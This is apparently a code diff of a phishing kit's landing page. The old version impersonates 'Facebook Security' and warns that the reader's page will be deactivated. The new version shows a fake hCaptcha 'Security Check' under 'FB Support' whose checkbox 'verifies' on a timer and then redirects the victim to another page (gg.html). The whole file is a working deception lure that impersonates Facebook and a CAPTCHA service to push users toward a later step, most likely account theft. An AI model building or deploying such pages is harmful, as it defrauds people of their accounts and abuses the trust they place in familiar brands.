@@ -1,175 +1,306 @@
-<html lang="en"><head>
+<!DOCTYPE html>
+<html lang="en">
+<head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
-    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
-    <title>Facebook Warning</title>
-    <link rel="icon" type="image/png" href="Facebook_Logo_2023.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check - FB Support</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: Arial, Helvetica, sans-serif;
         }
 
-        html,
         body {
-            height: 0%;
-            width: 100%;
-        }
-
-        #container {
-            height: 135%;
-            width: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #f3f4f6;
+            min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            background-color: #f0f2f5;
+            padding: 20px;
         }
 
-        #box {
-            height: 40%;
-            width: 45%;
-            background-color: rgb(255, 255, 255);
-            border-radius: 3px;
-            display: flex;
-            align-items: center;
-            flex-direction: column;
+        .security-card {
+            width: 100%;
+            max-width: 400px;
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            padding: 32px 24px;
         }
 
-        #box>img {
-            width: 70px;
-            margin-top: 15px;
+        .card-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #111827;
+            text-align: center;
+            margin-bottom: 24px;
         }
 
-        #data {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-top: 15px;
-        }
-
-        #data>h4 {
-            font-size: 25px;
-        }
-
-        #data>img {
-            width: 25px;
-        }
-
-        .line {
-            height: .7px;
-            background-color: rgba(0, 0, 0, 0.222);
-            width: 90%;
-            margin: 1rem;
-        }
-
-        #para h2 {
-            font-size: 16px;
-        }
-
-        #para {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        #para p {
-            margin: 20px 100px 0px 100px;
+        .card-text {
             font-size: 14px;
+            color: #6b7280;
+            line-height: 1.5;
+            text-align: center;
+            margin-bottom: 16px;
         }
 
-        #para button {
-            padding: 10px 20px 10px 20px;
-            margin-top: 25px;
-            border: none;
-            border-radius: 2px;
-            font-size: 18px;
-            background-color: #145dbd;
+        .card-instruction {
+            font-size: 14px;
+            color: #374151;
+            font-weight: 500;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        /* CAPTCHA Widget */
+        .captcha-widget {
+            border: 1px solid #e5e7eb;
+            border-radius: 8px;
+            padding: 16px;
+            background-color: #f9fafb;
+            margin-bottom: 24px;
+        }
+
+        .captcha-content {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .captcha-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .checkbox-container {
+            position: relative;
+        }
+
+        .checkbox {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #d1d5db;
+            border-radius: 4px;
             cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: white;
+            transition: all 0.2s;
         }
 
-        #para button a {
-            text-decoration: none;
-            color: #fff;
+        .checkbox.loading {
+            background-color: #f3f4f6;
+            border-color: #3b82f6;
+            cursor: not-allowed;
         }
 
-        #para button:hover {
-            background-color: #03469e;
+        .checkbox.checked {
+            background-color: #3b82f6;
+            border-color: #3b82f6;
         }
 
-        @media (max-width: 500px) {
-            #box {
-                margin: 0;
-                height: 45%;
-                width: 95%;
-                top: 0%;
+        .checkbox.checked::after {
+            content: '✓';
+            color: white;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid #e5e7eb;
+            border-top: 2px solid #3b82f6;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .checkbox-label {
+            font-size: 14px;
+            font-weight: 500;
+            color: #374151;
+            cursor: pointer;
+            user-select: none;
+            transition: color 0.2s;
+        }
+
+        .checkbox-label.disabled {
+            color: #9ca3af;
+            cursor: not-allowed;
+        }
+
+        .captcha-right {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .hcaptcha-logo {
+            width: 32px;
+            height: 32px;
+            background-color: #14b8a6;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 4px;
+        }
+
+        .hcaptcha-logo::after {
+            content: '';
+            width: 16px;
+            height: 16px;
+            background-color: white;
+            border-radius: 2px;
+        }
+
+        .hcaptcha-text {
+            font-size: 12px;
+            font-weight: 500;
+            color: #374151;
+            margin-bottom: 2px;
+        }
+
+        .hcaptcha-links {
+            font-size: 10px;
+            color: #9ca3af;
+        }
+
+        /* Continue Button */
+        .continue-btn {
+            width: 100%;
+            padding: 12px 24px;
+            background-color: #3b82f6;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .continue-btn:hover:not(:disabled) {
+            background-color: #2563eb;
+        }
+
+        .continue-btn:disabled {
+            background-color: #9ca3af;
+            cursor: not-allowed;
+        }
+
+        @media (max-width: 480px) {
+            .security-card {
+                padding: 24px 20px;
+                margin: 10px;
             }
-            #box>img {
-                width: 40px;
-            }
-            #data>h4 {
+            
+            .card-title {
                 font-size: 18px;
-            }
-            #data>img {
-                width: 15px;
-                margin-left: 2px;
-            }
-            .line {
-                height: .5px;
-                width: 90%;
-                margin-left: auto;
-                margin-right: auto;
-                background-color: #00000045;
-            }
-            #para {
-                margin: 0%;
-            }
-            #para>h2 {
-                font-size: 12px;
-                font-weight: 700;
-                margin-bottom: 10px;
-            }
-            #para>p {
-                margin: 5px 15px 0px 15px;
-                font-size: 14px;
-            }
-            #para button {
-                padding: 8px 18px 8px 18px;
-                margin-top: 15px;
-                border: none;
-                border-radius: 2px;
-                font-size: 13px;
-                background-color: #1877F2;
-                cursor: pointer;
             }
         }
     </style>
 </head>
-
 <body>
-    <div id="container">
-        <div id="box">
-            <img src="Facebook_Logo_2023.png" alt="">
-            <h5 id="groupSubHeader">Facebook Security</h5>
-            <div id="data">
-                <h4>Account Restrictions Service</h4> <img src="bluetick.png" alt="">
-            </div>
-            <div class="line"></div>
-            <div id="para">
-                <h2> Your Page Will Be Deactivated Soon</h2>
-                <p>𝐖𝐞 𝐖𝐢𝐥𝐥 𝐖𝐚𝐥𝐤 𝐘𝐨𝐮 𝐓𝐡𝐫𝐨𝐮𝐠𝐡 𝐒𝐞𝐯𝐞𝐫𝐚𝐥 𝐒𝐭𝐞𝐩𝐬 𝐭𝐨 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐚 𝐑𝐞𝐯𝐢𝐞𝐰 𝐘𝐨𝐮 𝐒𝐡𝐨𝐮𝐥𝐝 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞 𝐓𝐡𝐞𝐬𝐞 𝐒𝐭𝐞𝐩𝐬 𝐒𝐨 𝐓𝐡𝐚𝐭 𝐘𝐨𝐮𝐫 𝐏𝐚𝐠𝐞 𝐖𝐢𝐥𝐥 𝐍𝐨𝐭 𝐃𝐞𝐥𝐞𝐭𝐞𝐝 𝐏𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲.
-                    </p>
-                <button> <a href="request.html">Continue</a> </button>
+    <div class="security-card">
+        <h1 class="card-title">Security Check</h1>
+        
+        <p class="card-text">
+            This Site uses security checks to ensure the people accessing this site are real. Please complete the CAPTCHA below to continue.
+        </p>
+        
+        <p class="card-instruction">
+            Before you proceed, please complete the CAPTCHA below.
+        </p>
+
+        <!-- CAPTCHA Widget -->
+        <div class="captcha-widget">
+            <div class="captcha-content">
+                <div class="captcha-left">
+                    <div class="checkbox-container">
+                        <div class="checkbox" id="humanCheck"></div>
+                    </div>
+                    <label for="humanCheck" class="checkbox-label" id="checkboxLabel">I am human</label>
+                </div>
+                <div class="captcha-right">
+                    <div class="hcaptcha-logo"></div>
+                    <div class="hcaptcha-text">hCaptcha</div>
+                    <div class="hcaptcha-links">Privacy - Terms</div>
+                </div>
             </div>
         </div>
+
+        <button class="continue-btn" id="continueBtn" disabled>Continue</button>
     </div>
 
+    <script>
+        const checkbox = document.getElementById('humanCheck');
+        const checkboxLabel = document.getElementById('checkboxLabel');
+        const continueBtn = document.getElementById('continueBtn');
+        let isChecked = false;
+        let isLoading = false;
 
+        // Handle checkbox click
+        checkbox.addEventListener('click', function() {
+            if (isLoading || isChecked) return;
+            
+            // Start loading state
+            isLoading = true;
+            checkbox.classList.add('loading');
+            checkboxLabel.classList.add('disabled');
+            checkboxLabel.textContent = 'Verifying...';
+            
+            // Add spinner
+            const spinner = document.createElement('div');
+            spinner.className = 'spinner';
+            checkbox.appendChild(spinner);
+            
+            // After 2 seconds, complete the verification
+            setTimeout(function() {
+                // Remove spinner and loading state
+                checkbox.removeChild(spinner);
+                checkbox.classList.remove('loading');
+                checkbox.classList.add('checked');
+                checkboxLabel.classList.remove('disabled');
+                checkboxLabel.textContent = 'I am human';
+                
+                // Mark as checked and enable continue button
+                isChecked = true;
+                isLoading = false;
+                continueBtn.disabled = false;
+            }, 2000);
+        });
 
+        // Handle continue button click
+        continueBtn.addEventListener('click', function() {
+            if (isChecked) {
+                // Add a small delay to simulate processing
+                continueBtn.textContent = 'Redirecting...';
+                continueBtn.disabled = true;
+                
+                setTimeout(function() {
+                    // Redirect to gg.html
+                    window.location.href = 'gg.html';
+                }, 1000);
+            }
+        });
 
-
-
-</body></html>
+        // Handle label click
+        checkboxLabel.addEventListener('click', function() {
+            if (!isLoading && !isChecked) {
+                checkbox.click();
+            }
+        });
+    </script>
+</body>
+</html>
